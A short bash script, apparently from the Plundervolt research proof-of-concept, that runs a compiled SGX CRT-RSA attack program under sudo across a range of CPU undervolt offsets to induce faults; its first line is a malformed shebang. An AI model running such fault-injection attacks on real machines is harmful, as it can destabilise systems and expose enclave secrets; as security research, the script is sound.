#/bin/bash
cd ~/ramdisk/plundervolt/sgx_crt_rsa/

for i in {100..300}
do
    echo undervolt: $i
    sleep 1
    sudo ./app 1000000000 -$i
done
